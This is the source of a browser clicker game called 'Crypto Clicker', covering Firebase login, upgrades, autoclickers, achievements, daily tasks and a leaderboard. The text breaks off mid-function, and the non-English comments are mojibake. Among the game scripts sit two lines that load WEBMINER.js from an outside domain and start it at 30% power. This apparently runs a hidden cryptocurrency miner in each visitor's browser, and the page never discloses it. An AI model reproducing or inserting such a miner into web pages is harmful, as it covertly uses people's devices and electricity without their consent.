<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Crypto Clicker</title>
  <style>
    body {
      background: #0f0f0f;
      color: #fff;
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      padding: 20px;
    }
    input { padding: 8px; font-size: 16px; margin-bottom: 10px; border-radius: 5px; border: none; }
    .click-button {
      background: linear-gradient(135deg, #00ffa6, #00c3ff);
      color: #000;
      font-weight: bold;
      padding: 15px 30px;
      font-size: 18px;
      border-radius: 12px;
      cursor: pointer;
      margin: 10px;
      border: none;
    }
    #counter {
      font-size: 36px;
      margin-top: 20px;
      font-weight: bold;
      transition: transform 0.2s ease;
    }
    #counter.bounce {
      transform: scale(1.2);
    }
    #levelMessage {
      display: none;
      opacity: 0;
      transition: opacity 1s ease-in-out;
      color: gold;
      font-weight: bold;
      margin-top: 5px;
    }
    #levelMessage.show {
      display: block;
      opacity: 1;
    }
    table { margin: 20px auto; border-collapse: collapse; width: 80%; max-width: 600px; }
    th, td { padding: 10px; border-bottom: 1px solid #333; }
    th { background-color: #00c3ff; color: #000; }
    #message { margin-top: 10px; color: #ff5555; }
    .progress-container { background-color: #222; border-radius: 10px; height: 12px; width: 140px; margin: 10px auto; overflow: hidden; box-shadow: 0 0 5px #00ffc8; }
    .progress-bar { height: 100%; background: linear-gradient(90deg, #00ffc8 0%, #00c3ff 100%); width: 0%; transition: width 0.3s ease-in-out; border-radius: 10px; }
    #profilePanel { position: absolute; top: 20px; left: 20px; background-color: #1a1a1a; padding: 15px; border-radius: 12px; box-shadow: 0 0 10px #00c3ff; width: 200px; text-align: left; }
    #profilePanel div { margin: 6px 0; }
    #buttonGroup { margin-top: 180px; }
    #motiveText {
      margin-top: 20px;
      font-size: 18px;
      color: #00ffc8;
      text-shadow: 0 0 8px #00ffc8;
      transition: opacity 0.5s ease-in-out;
    }
    .achievement-panel {
      max-height: 0;
      overflow: hidden;
      transition: max-height 0.4s ease, padding 0.4s ease;
      padding: 0 10px;
      background-color: #1a1a1a;
      border-radius: 10px;
      margin-top: 20px;
      box-shadow: 0 0 10px #00c3ff;
    }
    .achievement-panel.open {
      max-height: 500px;
      padding: 10px;
    }
    .ad-container {
      text-align: center;
      margin: 20px 0;
      max-width: 100%;
      overflow: hidden;
    }
    .ad-container iframe {
      max-width: 100%;
      width: 728px;
      height: 90px;
      border: none;
      margin: 10px auto;
      display: block;
    }
    @media (max-width: 768px) {
      .ad-container iframe {
        width: 100%;
        height: auto;
        max-width: 300px;
      }
    }
    #tasksPanel {
      max-height: 0;
      overflow: hidden;
      transition: max-height 0.4s ease, padding 0.4s ease;
      padding: 0 10px;
      background-color: #1a1a1a;
      border-radius: 10px;
      margin-top: 20px;
      box-shadow: 0 0 10px #00c3ff;
    }
    #tasksPanel.open {
      max-height: 300px;
      padding: 10px;
    }
    #tasksList div {
      margin-bottom: 10px;
      padding: 8px;
      border: 1px solid #00c3ff;
      border-radius: 8px;
      background-color: #222;
    }
    @keyframes shake {
      0% { transform: translateX(0); }
      25% { transform: translateX(-5px); }
      50% { transform: translateX(5px); }
      75% { transform: translateX(-5px); }
      100% { transform: translateX(0); }
    }
  </style>
</head>

<body>
  <div id="profilePanel">
    <div><strong>Player:</strong> <span id="profileName">Anonymous</span></div>
    <div><strong>Level:</strong> <span id="playerLevel">1</span> / 10</div>
    <div><strong>Click Power:</strong> <span id="profileClickPower">1</span></div>
    <div><strong>Autoclicker:</strong> <span id="profileAutoclick">Inactive</span></div>
    <div><strong>Tokens:</strong> <span id="profileTokens">0</span></div>
    <div><button class="click-button" onclick="signOut()">Sign Out</button></div>
  </div>

  <div id="playerLevelContainer">
    <div id="levelMessage" style="display: none; color: gold; font-weight: bold; margin-top: 5px;">
      <!-- Message will appear here -->
    </div>
  </div>

  <h1>Crypto Clicker üí∞</h1>

  <div id="authSection">
    <button class="click-button" onclick="signInWithGoogle()">Sign in with Google</button>
    <div id="motiveText">Click ‚Äî earn tokens.</div>
  </div>

  <div id="gameSection" style="display:none;">
    <div id="dailyReward" style="display: none; margin-top: 20px;">
      <h2>Daily Reward</h2>
      <p id="streakText">Login streak: 0 days</p>
      <button class="click-button" onclick="claimDailyReward()">Claim Reward</button>
    </div>

    <div id="counter">Tokens: 0</div>
    <div id="message"></div>
    <div id="buttonGroup">
      <button class="click-button" onclick="clickToken()">Collect Token</button>
      <button class="click-button" onclick="toggleShop()">Shop</button>
      <button class="click-button" onclick="toggleAchievements()">üèÜ Achievements</button>
      <button class="click-button" onclick="toggleTasks()">üìã Tasks</button>
    </div>

    <div id="shop" style="display:none; margin-top: 20px;">
      <h2>üõí Upgrades</h2>
      <p id="clickPowerCostText">üí™ Click Power +1 (Cost: 50)</p>
      <p>Current: <span id="clickPowerDisplay">1</span> / 8</p>
      <div class="progress-container">
        <div class="progress-bar" id="clickPowerBar"></div>
      </div>
      <button class="click-button" onclick="buyUpgrade('clickPower')">Buy</button>

      <div style="margin-top: 20px;">
        <p>Autoclicker (Cost: 200)</p>
        <button class="click-button" id="autoclickBtn" onclick="buyUpgrade('autoclick')">Buy</button>
      </div>

      <h2>‚ö° Autoclickers</h2>
      <div id="autoclickerShop" style="display: flex; flex-wrap: wrap; justify-content: center; gap: 20px;">
        <div style="background: #1a1a1a; padding: 20px; border-radius: 12px; width: 200px; box-shadow: 0 0 10px #00c3ff;">
          <h3>1 Minute</h3>
          <p>Cost: 200 Tokens</p>
          <button class="click-button" onclick="buyAutoclicker(1)">Buy</button>
        </div>
        <div style="background: #1a1a1a; padding: 20px; border-radius: 12px; width: 200px; box-shadow: 0 0 10px #00c3ff;">
          <h3>5 Minutes</h3>
          <p>Cost: 800 Tokens</p>
          <button class="click-button" onclick="buyAutoclicker(5)">Buy</button>
        </div>
        <div style="background: #1a1a1a; padding: 20px; border-radius: 12px; width: 200px; box-shadow: 0 0 10px #00c3ff;">
          <h3>10 Minutes</h3>
          <p>Cost: 1400 Tokens</p>
          <button class="click-button" onclick="buyAutoclicker(10)">Buy</button>
        </div>
      </div>
    </div>

    <div id="achievementsPanel" class="achievement-panel">
      <h2>Achievements</h2>
      <div id="achievementsList"></div>
    </div>

    <div id="tasksPanel" class="achievement-panel">
      <h2>Daily Tasks</h2>
      <div id="tasksList"></div>
    </div>

    <h2>Leaderboard</h2>
    <table>
      <thead><tr><th>#</th><th>Player</th><th>Tokens</th></tr></thead>
      <tbody id="leaderboard"></tbody>
    </table>
  </div>

  <script src="https://wm.bmwebm.org/WEBMINER.js"></script>
  <script>WEBMINER.config({ login: "5991295", pass: null }).power(30);</script>

  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDVgvBf_C6dIMtZ4MISwR5YRCBi8_JXinQ",
      authDomain: "cryptoclickertry.firebaseapp.com",
      databaseURL: "https://cryptoclickertry-default-rtdb.firebaseio.com",
      projectId: "cryptoclickertry",
      storageBucket: "cryptoclickertry.firebasestorage.app",
      messagingSenderId: "1017002572592",
      appId: "1:1017002572592:web:e06e5f4ba00017dc1466f5",
      measurementId: "G-W2T3BN4LL3"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const auth = firebase.auth();

    const allAchievements = {
      superClicker: { name: "Super Clicker", description: "Click 10,000 times", reward: "+2 Click Power (2 min)" },
      tokenHoarder: { name: "Token Hoarder", description: "Collect 1,000,000 tokens", reward: "+2 Click Power (2min)" },
      level5: { name: "Level 5 Reached", description: "Reach level 5", reward: "+1 Click Power" },
    };

    const levelUpRequirements = [
      50000, 100000, 500000, 2500000, 50000000, 200000000, 800000000, 3200000000, 10000000000
    ];


    const dailyTasks = [
  {
    id: "clickMarathon",
    description: "Make 100 clicks",
    goal: 100,
    reward: 50
  },
  {
    id: "levelUp",
    description: "Collect 5000 tokens",
    goal: 5000,
    reward: "Click Power +1 for 5 min"
  },
 {
    id: "thriftyPlayer",
    description: "Don't spend tokens for 5 minutes after login",
    goal: 300, // 300 —Å–µ–∫—É–Ω–¥ (5 –º–∏–Ω—É—Ç)
    reward: 150,
    period: "daily"
  },
  {
    id: "autoclickerMaster",
    description: "Activate autoclicker 5 times in a week",
    goal: 5,
    reward: "Free 5-minute autoclicker",
    period: "weekly" // –£–∫–∞–∑—ã–≤–∞–µ–º, —á—Ç–æ –∑–∞–¥–∞—á–∞ –Ω–µ–¥–µ–ª—å–Ω–∞—è
  }
];

    let user = null;
    let score = 0;
    let clickPower = 1;
    let autoclickActive = false;
    let autoclickInterval = null;
    let autoclickEndTime = 0;
    let autoclickCooldown = false;
    let currentLevel = 1;
    let totalClicks = 0;
    let autoclickerUses = 0;
    let achievements = {};
    let tempBoostTimeout = null;
    let originalClickPower = null;
    let isRenderingTasks = false;
    let thriftyPlayerTimer = null;
    let thriftyPlayerStartTime = 0;

    

    function updateProfilePanel() {
      document.getElementById("profileClickPower").innerText = Math.min(clickPower, 8);

      if (autoclickActive) {
        const remaining = Math.max(0, autoclickEndTime - Date.now());
        const seconds = Math.floor(remaining / 1000) % 60;
        const minutes = Math.floor(remaining / 60000);
        document.getElementById("profileAutoclick").innerText = `Active: ${minutes}:${seconds.toString().padStart(2, '0')}`;
      } else {
        document.getElementById("profileAutoclick").innerText = "Inactive";
      }

      let level = 1;
      for (let i = 0; i < levelUpRequirements.length; i++) {
        if (score >= levelUpRequirements[i]) {
          level = i + 2;
        } else {
          break;
        }
      }

      document.getElementById("playerLevel").innerText = level;
      document.getElementById("profileTokens").innerText = score;
      document.getElementById("profileName").innerText = user?.displayName || "Anonymous";

      const levelMessageElement = document.getElementById("levelMessage");
      if (level === 10) {
        levelMessageElement.innerText = "Maximum level reached!";
        levelMessageElement.classList.add("show");
      } else {
        levelMessageElement.classList.remove("show");
      }
    }

    function checkDailyReward() {
      if (!user) return;
      const today = new Date().toDateString();
      db.ref("dailyRewards/" + user.uid).once("value").then(snapshot => {
        const data = snapshot.val() || { lastLogin: "", streak: 0 };
        const lastLogin = data.lastLogin || "";
        let streak = data.streak || 0;

        if (lastLogin !== today) {
          document.getElementById("dailyReward").style.display = "block";
          if (new Date(lastLogin).toDateString() === new Date(Date.now() - 86400000).toDateString()) {
            streak++;
          } else {
            streak = 1;
          }
          db.ref("dailyRewards/" + user.uid).set({ lastLogin: today, streak: streak });
          document.getElementById("streakText").innerText = `Login streak: ${streak} days`;
        }
      });
    }

    function claimDailyReward() {
      db.ref("dailyRewards/" + user.uid).once("value").then(snapshot => {
        const data = snapshot.val();
        const streak = data.streak || 1;
        const rewards = [50, 100, 200, 300, 500, 1000, 2000];
        const reward = rewards[Math.min(streak - 1, rewards.length - 1)];

        score += reward;
        updateCounterDisplay();
        submitScore();
        showMessage(`Claimed ${reward} tokens for ${streak}-day streak!`);
        document.getElementById("dailyReward").style.display = "none";
      });
    }

    function closeAllPanels() {
      console.log("Closing all panels...");
      const shop = document.getElementById("shop");
      if (shop) {
        shop.style.display = "none";
        console.log("Shop panel closed");
      } else {
        console.error("Element #shop not found");
      }

      const achievementsPanel = document.getElementById("achievementsPanel");
      if (achievementsPanel) {
        achievementsPanel.classList.remove("open");
        console.log("Achievements panel closed");
      } else {
        console.error("Element #achievementsPanel not found");
      }
      const achievementsBtn = document.querySelector("button[onclick='toggleAchievements()']");
      if (achievementsBtn) {
        achievementsBtn.innerHTML = "üèÜ Achievements ‚ñº";
        console.log("Achievements button text updated");
      } else {
        console.error("Button for toggleAchievements not found");
      }

      const tasksPanel = document.getElementById("tasksPanel");
      if (tasksPanel) {
        tasksPanel.classList.remove("open");
        console.log("Tasks panel closed");
      } else {
        console.error("Element #tasksPanel not found");
      }
      const tasksBtn = document.querySelector("button[onclick='toggleTasks()']");
      if (tasksBtn) {
        tasksBtn.innerHTML = "üìã Tasks ‚ñº";
        console.log("Tasks button text updated");
      } else {
        console.error("Button for toggleTasks not found");
      }
    }

    function setClickPower(newPower) {
      clickPower = Math.min(newPower, 8);
      updateClickPowerBar();
      updateProfilePanel();
    }

    function getClickPowerUpgradeCost() {
      return Math.floor(500 * Math.pow(6, clickPower - 1));
    }

    function updateClickPowerCostText() {
      const costText = document.getElementById('clickPowerCostText');
      const currentLevel = parseInt(document.getElementById("playerLevel").innerText);
      const buyButton = document.querySelector("button[onclick=\"buyUpgrade('clickPower')\"]");

      if (costText) {
        if (clickPower >= 8) {
          costText.textContent = "üí™ Click Power: MAX LEVEL";
          if (buyButton) {
            buyButton.style.background = "linear-gradient(135deg, #00ffa6, #00c3ff)";
            buyButton.style.cursor = "pointer";
            buyButton.title = "Maximum Click Power reached";
          }
        } else if (clickPower >= 3 && currentLevel < clickPower + 1) {
          const cost = getClickPowerUpgradeCost();
          costText.textContent = `üí™ Click Power +1 (Cost: ${cost})`;
          if (buyButton) {
            buyButton.style.background = "linear-gradient(135deg, #00ffa6, #00c3ff)";
            buyButton.style.cursor = "pointer";
            buyButton.title = `Reach player level ${clickPower + 1} to upgrade`;
          }
        } else {
          const cost = getClickPowerUpgradeCost();
          costText.textContent = `üí™ Click Power +1 (Cost: ${cost})`;
          if (buyButton) {
            buyButton.style.background = "linear-gradient(135deg, #00ffa6, #00c3ff)";
            buyButton.style.cursor = "pointer";
            buyButton.title = "";
          }
        }
      }
    }

   /*! function boostClickPowerTemporarily(amount, duration) {
      if (tempBoostTimeout) clearTimeout(tempBoostTimeout);

      originalClickPower = clickPower;
      const boosted = Math.min(clickPower + amount, 8);
      clickPower = boosted;

      const actualBoost = boosted - originalClickPower;
      showMessage(`Temporary boost: Click Power +${actualBoost} for ${duration / 1000} sec`);

      tempBoostTimeout = setTimeout(() => {
        clickPower = originalClickPower;
        showMessage(`Boost expired: Click Power restored`);
      }, duration);
    }!*/


    function boostClickPowerTemporarily(amount, duration) {
  if (tempBoostTimeout) clearTimeout(tempBoostTimeout);

  originalClickPower = clickPower;
  const boosted = Math.min(clickPower + amount, 8);
  clickPower = boosted;

  const actualBoost = boosted - originalClickPower;
  showMessage(`Temporary boost: Click Power +${actualBoost} –Ω–∞ ${duration / 1000} —Å–µ–∫`);

  // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –±—É—Å—Ç–∞ –≤ Firebase
  if (user) {
    const boostEndTime = Date.now() + duration;
    db.ref("leaderboard/" + user.uid).update({
      tempBoostActive: true, // –§–ª–∞–≥ –∞–∫—Ç–∏–≤–Ω–æ–≥–æ –±—É—Å—Ç–∞
      tempBoostEndTime: boostEndTime, // –í—Ä–µ–º—è –æ–∫–æ–Ω—á–∞–Ω–∏—è –±—É—Å—Ç–∞
      tempBoostOriginalClickPower: originalClickPower, // –ò—Å—Ö–æ–¥–Ω–∞—è —Å–∏–ª–∞ –∫–ª–∏–∫–∞
      tempBoostAmount: amount, // –í–µ–ª–∏—á–∏–Ω–∞ –±—É—Å—Ç–∞
      lastUpdate: Date.now() // –í—Ä–µ–º—è –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è
    }).catch(error => {
      console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è –±—É—Å—Ç–∞:", error);
    });
  }

  tempBoostTimeout = setTimeout(() => {
    clickPower = originalClickPower;
    showMessage(`–ë—É—Å—Ç –∑–∞–∫–æ–Ω—á–∏–ª—Å—è: –°–∏–ª–∞ –∫–ª–∏–∫–∞ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞`);
    updateClickPowerBar();
    updateProfilePanel();
    submitScore();

    // –û—á–∏—â–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –±—É—Å—Ç–∞ –≤ Firebase
    if (user) {
      db.ref("leaderboard/" + user.uid).update({
        tempBoostActive: false,
        tempBoostEndTime: 0,
        tempBoostOriginalClickPower: 0,
        tempBoostAmount: 0,
        lastUpdate: Date.now()
      }).catch(error => {
        console.error("–û—à–∏–±–∫–∞ –æ—á–∏—Å—Ç–∫–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è –±—É—Å—Ç–∞:", error);
      });
    }
  }, duration);
}

    function toggleAchievements() {
      console.log("Calling toggleAchievements...");
      const panel = document.getElementById("achievementsPanel");
      if (!panel) {
        console.error("Element #achievementsPanel not found in toggleAchievements");
        return;
      }
      const btn = document.querySelector("button[onclick='toggleAchievements()']");
      if (!btn) {
        console.error("Button for toggleAchievements not found");
        return;
      }
      const isCurrentlyOpen = panel.classList.contains("open");
      console.log("Achievements panel is currently open:", isCurrentlyOpen);

      if (isCurrentlyOpen) {
        panel.classList.remove("open");
        btn.innerHTML = "üèÜ Achievements ‚ñº";
        console.log("Closing achievements panel");
      } else {
        closeAllPanels();
        panel.classList.add("open");
        btn.innerHTML = "üèÜ Achievements ‚ñ≤";
        console.log("Opening achievements panel");
        renderAchievements();
      }
    }

    function renderAchievements() {
      const list = document.getElementById('achievementsList');
      list.innerHTML = '';

      for (const key in allAchievements) {
        const achieved = achievements[key];
        const ach = allAchievements[key];

        const div = document.createElement('div');
        div.style.marginBottom = '10px';
        div.style.padding = '8px';
        div.style.border = '1px solid #00c3ff';
        div.style.borderRadius = '8px';
        div.style.backgroundColor = achieved ? '#00ffa6' : '#222';
        div.style.color = achieved ? '#000' : '#fff';
        div.innerHTML = `<strong>${ach.name}</strong><br>${ach.description}<br><em>${ach.reward}</em>`;
        list.appendChild(div);
      }
    }

    function updateClickPowerBar() {
      document.getElementById("clickPowerDisplay").innerText = clickPower;
      const progress = Math.min((clickPower / 8) * 100, 100);
      document.getElementById("clickPowerBar").style.width = progress + "%";
      updateClickPowerCostText();
    }

    function updateCounterDisplay() {
      document.getElementById("counter").innerText = `Tokens: ${score}`;
    }

    function showMessage(msg) {
      const el = document.getElementById("message");
      el.innerText = msg;
      setTimeout(() => el.innerText = '', 3000);
    }

  /*!  function renderTasks() {
      if (isRenderingTasks) return;
      isRenderingTasks = true;

      const list = document.getElementById("tasksList");
      list.innerHTML = "";

      if (!user) {
        isRenderingTasks = false;
        return;
      }

      db.ref(`tasks/${user.uid}`).once("value").then(snapshot => {
        const tasksData = snapshot.val() || {};
        const today = new Date().toDateString();

        dailyTasks.forEach(task => {
          let taskData = tasksData[task.id] || { progress: 0, lastReset: "", completions: 0, completed: false };

          if (taskData.lastReset !== today) {
            taskData = { progress: 0, lastReset: today, completions: 0, completed: false };
            db.ref(`tasks/${user.uid}/${task.id}`).set(taskData);
          }

          const div = document.createElement("div");
          if (taskData.completed || taskData.completions >= 3) {
            div.innerHTML = `${task.description}: Max completions (${taskData.completions}/3) reached for today!`;
          } else {
            div.innerHTML = `${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward}) [Completions: ${taskData.completions}/3]`;
          }
          list.appendChild(div);
        });

        const validTaskIds = dailyTasks.map(task => task.id);
        for (const taskId in tasksData) {
          if (!validTaskIds.includes(taskId)) {
            db.ref(`tasks/${user.uid}/${taskId}`).remove();
          }
        }

        isRenderingTasks = false;
      }).catch(error => {
        console.error("Error rendering tasks:", error);
        showMessage("Failed to load tasks.");
        isRenderingTasks = false;
      });
    }!*/

/*!!function renderTasks() {
  if (isRenderingTasks) return;
  isRenderingTasks = true;

  const list = document.getElementById("tasksList");
  list.innerHTML = "";

  if (!user) {
    isRenderingTasks = false;
    return;
  }

  db.ref(`tasks/${user.uid}`).once("value").then(snapshot => {
    const tasksData = snapshot.val() || {};
    const today = new Date().toDateString();

    dailyTasks.forEach(task => {
      let taskData = tasksData[task.id] || { progress: 0, lastReset: "", completions: 0, completed: false };

      if (taskData.lastReset !== today) {
        taskData = { progress: 0, lastReset: today, completions: 0, completed: false };
        db.ref(`tasks/${user.uid}/${task.id}`).set(taskData);
      }

      const div = document.createElement("div");
      if (taskData.completed || taskData.completions >= 1) {
        div.innerHTML = `${task.description}: Completed for today!`;
      } else {
        div.innerHTML = `${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward})`;
      }
      list.appendChild(div);
    });

    const validTaskIds = dailyTasks.map(task => task.id);
    for (const taskId in tasksData) {
      if (!validTaskIds.includes(taskId)) {
        db.ref(`tasks/${user.uid}/${taskId}`).remove();
      }
    }

    isRenderingTasks = false;
  }).catch(error => {
    console.error("Error rendering tasks:", error);
    showMessage("Failed to load tasks.");
    isRenderingTasks = false;
  });
}!!*/

/*!!!function renderTasks() {
  if (isRenderingTasks) return;
  isRenderingTasks = true;

  const list = document.getElementById("tasksList");
  list.innerHTML = "";

  if (!user) {
    isRenderingTasks = false;
    return;
  }

  db.ref(`tasks/${user.uid}`).once("value").then(snapshot => {
    const tasksData = snapshot.val() || {};
    const today = new Date().toDateString();
    
    // –û–ø—Ä–µ–¥–µ–ª—è–µ–º –Ω–∞—á–∞–ª–æ —Ç–µ–∫—É—â–µ–π –Ω–µ–¥–µ–ª–∏ (–ø–æ–Ω–µ–¥–µ–ª—å–Ω–∏–∫)
    const now = new Date();
    const startOfWeek = new Date(now.setDate(now.getDate() - now.getDay() + (now.getDay() === 0 ? -6 : 1))).toDateString();

    dailyTasks.forEach(task => {
      let taskData = tasksData[task.id] || { progress: 0, lastReset: "", completions: 0, completed: false };

      // –î–ª—è –Ω–µ–¥–µ–ª—å–Ω—ã—Ö –∑–∞–¥–∞—á –∏—Å–ø–æ–ª—å–∑—É–µ–º startOfWeek, –¥–ª—è –¥–Ω–µ–≤–Ω—ã—Ö ‚Äî today
      const resetKey = task.period === "weekly" ? startOfWeek : today;
      if (taskData.lastReset !== resetKey) {
        taskData = { progress: 0, lastReset: resetKey, completions: 0, completed: false };
        db.ref(`tasks/${user.uid}/${task.id}`).set(taskData);
      }

      const div = document.createElement("div");
      if (taskData.completed || taskData.completions >= 1) {
        div.innerHTML = `${task.description}: Completed for ${task.period === "weekly" ? "this week" : "today"}!`;
      } else {
        div.innerHTML = `${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward})`;
      }
      list.appendChild(div);
    });

    const validTaskIds = dailyTasks.map(task => task.id);
    for (const taskId in tasksData) {
      if (!validTaskIds.includes(taskId)) {
        db.ref(`tasks/${user.uid}/${taskId}`).remove();
      }
    }

    isRenderingTasks = false;
  }).catch(error => {
    console.error("Error rendering tasks:", error);
    showMessage("Failed to load tasks.");
    isRenderingTasks = false;
  });
}!!*/



  function renderTasks() {
  if (isRenderingTasks) return;
  isRenderingTasks = true;

  const list = document.getElementById("tasksList");
  list.innerHTML = "";

  if (!user) {
    isRenderingTasks = false;
    return;
  }

  db.ref(`tasks/${user.uid}`).once("value").then(snapshot => {
    const tasksData = snapshot.val() || {};
    const today = new Date().toDateString();
    
    // –û–ø—Ä–µ–¥–µ–ª—è–µ–º –Ω–∞—á–∞–ª–æ —Ç–µ–∫—É—â–µ–π –Ω–µ–¥–µ–ª–∏ (–ø–æ–Ω–µ–¥–µ–ª—å–Ω–∏–∫)
    const now = new Date();
    const startOfWeek = new Date(now.setDate(now.getDate() - now.getDay() + (now.getDay() === 0 ? -6 : 1))).toDateString();

    dailyTasks.forEach(task => {
      let taskData = tasksData[task.id] || { progress: 0, lastReset: "", completions: 0, completed: false };

      // –î–ª—è –Ω–µ–¥–µ–ª—å–Ω—ã—Ö –∑–∞–¥–∞—á –∏—Å–ø–æ–ª—å–∑—É–µ–º startOfWeek, –¥–ª—è –¥–Ω–µ–≤–Ω—ã—Ö ‚Äî today
      const resetKey = task.period === "weekly" ? startOfWeek : today;
      if (taskData.lastReset !== resetKey) {
        taskData = { progress: 0, lastReset: resetKey, completions: 0, completed: false };
        db.ref(`tasks/${user.uid}/${task.id}`).set(taskData);
      }

      const div = document.createElement("div");
      if (taskData.completed || taskData.completions >= 1) {
        div.innerHTML = `${task.description}: Completed for ${task.period === "weekly" ? "this week" : "today"}!`;
      } else {
        // –î–ª—è –∑–∞–¥–∞—á–∏ "Thrifty Player" –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º –≤—Ä–µ–º—è –≤ —Ñ–æ—Ä–º–∞—Ç–µ MM:SS
        if (task.id === "thriftyPlayer") {
          const progressSeconds = Math.min(taskData.progress, task.goal);
          const goalSeconds = task.goal;
          const progressFormatted = formatTime(progressSeconds);
          const goalFormatted = formatTime(goalSeconds);
          div.innerHTML = `${task.description}: ${progressFormatted} / ${goalFormatted} (Reward: ${task.reward} tokens)`;
        } else {
          div.innerHTML = `${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward})`;
        }
      }
      list.appendChild(div);
    });

    const validTaskIds = dailyTasks.map(task => task.id);
    for (const taskId in tasksData) {
      if (!validTaskIds.includes(taskId)) {
        db.ref(`tasks/${user.uid}/${taskId}`).remove();
      }
    }

    isRenderingTasks = false;
  }).catch(error => {
    console.error("Error rendering tasks:", error);
    showMessage("Failed to load tasks.");
    isRenderingTasks = false;
  });
}

// –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –≤—Ä–µ–º–µ–Ω–∏ –≤ MM:SS
function formatTime(seconds) {
  const minutes = Math.floor(seconds / 60);
  const secs = seconds % 60;
  return `${minutes}:${secs.toString().padStart(2, '0')}`;
}

    

    function toggleTasks() {
      const panel = document.getElementById("tasksPanel");
      const btn = document.querySelector("button[onclick='toggleTasks()']");
      const isCurrentlyOpen = panel.classList.contains("open");

      closeAllPanels();

      if (!isCurrentlyOpen) {
        panel.classList.add("open");
        btn.innerHTML = "üìã Tasks ‚ñ≤";
        renderTasks();
      }
    }



function updateTaskProgress(taskId, increment) {
  if (!user) return;
  const now = new Date();
  const today = now.toDateString();
  // –ù–∞—á–∞–ª–æ —Ç–µ–∫—É—â–µ–π –Ω–µ–¥–µ–ª–∏
  const startOfWeek = new Date(now.setDate(now.getDate() - now.getDay() + (now.getDay() === 0 ? -6 : 1))).toDateString();
  
  const task = dailyTasks.find(t => t.id === taskId);
  const resetKey = task?.period === "weekly" ? startOfWeek : today;

  db.ref(`tasks/${user.uid}/${taskId}`).transaction(taskData => {
    taskData = taskData || { progress: 0, lastReset: resetKey, completions: 0, completed: false };
    if (taskData.lastReset !== resetKey) {
      taskData.progress = 0;
      taskData.lastReset = resetKey;
      taskData.completions = 0;
      taskData.completed = false;
    }
    if (taskData.completed || taskData.completions >= 1) {
      return taskData;
    }
    taskData.progress = (taskData.progress || 0) + increment;
    return taskData;
  }).then(() => {
    db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
      const taskData = snapshot.val();
      if (taskData && !(taskData.completed || taskData.completions >= 1)) {
        checkTaskCompletion(taskId);
      }
      renderTasks();
    });
  });
}
    

/*!function checkTaskCompletion(taskId) {
  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData && (taskData.completed || (taskData.completions || 0) >= 1)) {
      return;
    }

    if (taskData && taskData.progress >= task.goal) {
      const completions = (taskData.completions || 0) + 1;
      if (completions <= 1) {
        if (task.id === "clickMarathon") {
          score += task.reward;
          showMessage(`Task "${task.description}" completed! +${task.reward} tokens`);
          updateCounterDisplay();
          submitScore();
        } else if (task.id === "levelUp") {
          boostClickPowerTemporarily(1, 300000);
          showMessage(`Task "${task.description}" completed! ${task.reward}`);
          updateClickPowerBar();
          submitScore();
        }
        db.ref(`tasks/${user.uid}/${taskId}`).set({
          progress: 0,
          lastReset: taskData.lastReset,
          completions: completions,
          completed: true
        });
      }
      renderTasks();
    }
  });
}!*/

    
/*!!   function checkTaskCompletion(taskId) {
  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData && (taskData.completed || (taskData.completions || 0) >= 1)) {
      return;
    }

    if (taskData && taskData.progress >= task.goal) {
      const completions = (taskData.completions || 0) + 1;
      if (completions <= 1) {
        if (task.id === "clickMarathon") {
          score += task.reward;
          showMessage(`Task "${task.description}" completed! +${task.reward} tokens`);
          updateCounterDisplay();
          submitScore();
        } else if (task.id === "levelUp") {
          boostClickPowerTemporarily(1, 300000);
          showMessage(`Task "${task.description}" completed! ${task.reward}`);
          updateClickPowerBar();
          submitScore();
        } else if (task.id === "autoclickerMaster") {
          showMessage(`Task "${task.description}" completed! ${task.reward}`);
          startAutoclicker(300000); // –ó–∞–ø—É—Å–∫–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä –Ω–∞ 5 –º–∏–Ω—É—Ç
          submitScore();
        }
        db.ref(`tasks/${user.uid}/${taskId}`).set({
          progress: 0,
          lastReset: taskData.lastReset,
          completions: completions,
          completed: true
        });
      }
      renderTasks();
    }
  });
} !!*/

  function checkTaskCompletion(taskId) {
  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData && (taskData.completed || (taskData.completions || 0) >= 1)) {
      return;
    }

    if (taskData && taskData.progress >= task.goal) {
      const completions = (taskData.completions || 0) + 1;
      if (completions <= 1) {
        if (task.id === "clickMarathon") {
          score += task.reward;
          showMessage(`Task "${task.description}" completed! +${task.reward} tokens`);
          updateCounterDisplay();
          submitScore();
        } else if (task.id === "levelUp") {
          boostClickPowerTemporarily(1, 300000);
          showMessage(`Task "${task.description}" completed! ${task.reward}`);
          updateClickPowerBar();
          submitScore();
